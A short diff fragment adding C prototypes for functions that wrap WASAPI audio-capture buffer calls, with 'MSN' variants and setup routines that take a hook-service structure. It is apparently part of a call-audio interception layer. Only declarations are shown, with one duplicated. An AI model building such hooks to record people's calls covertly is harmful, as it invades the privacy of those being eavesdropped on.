+	UINT32* pNumFramesToRead,
+	DWORD* pdwFlags,
+	UINT64* pu64DevicePosition,
+	UINT64* pu64QPCPosition);
+
+HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
+	BYTE** ppData,
+	UINT32* pNumFramesToRead,
+	DWORD* pdwFlags,
+	UINT64* pu64DevicePosition,
+	UINT64* pu64QPCPosition);
+
+DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct* pData);
+
+DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct* pData);
+HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
+	DWORD NumFramesWrittem);
+HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
+	DWORD NumFramesWrittem);
+HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
+	DWORD NumFramesWrittem);
+DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct* pData);
+DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct* pData);
